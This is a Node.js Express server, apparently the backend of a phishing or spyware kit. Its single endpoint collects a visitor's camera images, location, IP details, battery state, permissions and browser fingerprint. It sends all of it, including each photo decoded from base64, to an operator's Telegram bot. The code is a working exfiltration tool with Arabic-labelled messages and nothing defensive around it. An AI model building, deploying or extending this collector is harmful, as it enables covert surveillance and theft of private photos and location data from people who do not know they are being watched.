const express = require('express');
const bodyParser = require('body-parser');
const UAParser = require('ua-parser-js');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/submitData', async (req, res) => {
  try {
    const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;

    const userAgent = req.headers['user-agent'] || '';

    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();
    const engine = parser.getEngine();

    const browserName = browser.name || 'غير معروف';
    const browserVersion = browser.version ? ` ${browser.version}` : '';
    const osName = os.name || '';
    const osVersion = os.version ? ` ${os.version}` : '';
    const deviceVendor = device.vendor ? ` (${device.vendor})` : '';
    const deviceModel = device.model ? ` ${device.model}` : '';
    let detailedBrowser = `${browserName}${browserVersion}`;
    if (osName) detailedBrowser += ` - ${osName}${osVersion}`;
    if (deviceVendor || deviceModel) detailedBrowser += ` على${deviceVendor}${deviceModel}`;

    const engineName = engine.name ? ` (محرك: ${engine.name})` : '';
    detailedBrowser += engineName;

    const text = `📱 **بيانات جديدة من المستخدم**
    
🆔 **Chat ID**: ${chatId || 'غير موجود'}
📍 **الموقع**: ${location || 'غير متاح'}
🔐 **الصلاحيات**: ${permissions || 'غير محددة'}
🌐 **معلومات IP**: ${ipInfo || 'غير متوفرة'}
🔋 **حالة البطارية**: ${battery || 'غير معروفة'}
🌍 **المتصفح الدقيق**: ${detailedBrowser}
🖥️ **User-Agent الخام**: ${userAgent}
    `;

    const botToken = process.env.to;
    const chatIdTelegram = process.env.id || chatId;

    if (!botToken) {

      return;
    }

    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatIdTelegram,
      text: text,
      parse_mode: 'Markdown'
    });

    if (imageDatas) {
      const imagesArray = imageDatas.split(',').filter(img => img.trim() !== '');
      for (let i = 0; i < imagesArray.length; i++) {
        const imgBase64 = imagesArray[i];
        const buffer = Buffer.from(imgBase64, 'base64');
        const form = new FormData();
        form.append('chat_id', chatIdTelegram);
        form.append('document', buffer, {
          filename: `image_${i+1}.jpg`,
          contentType: 'image/jpeg',
        });

        await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, form, {
          headers: form.getHeaders(),
          maxBodyLength: Infinity,
        });
      }
    }

  } catch (error) {
    console.error('error', error.message);
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
      try {
        await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
          chat_id: process.env.CHAT_ID,
          text: `error${error.message}`
        });
      } catch (e) {}
    }
  }
});

app.listen(PORT, () => {
  console.log(`good${PORT}`);
});
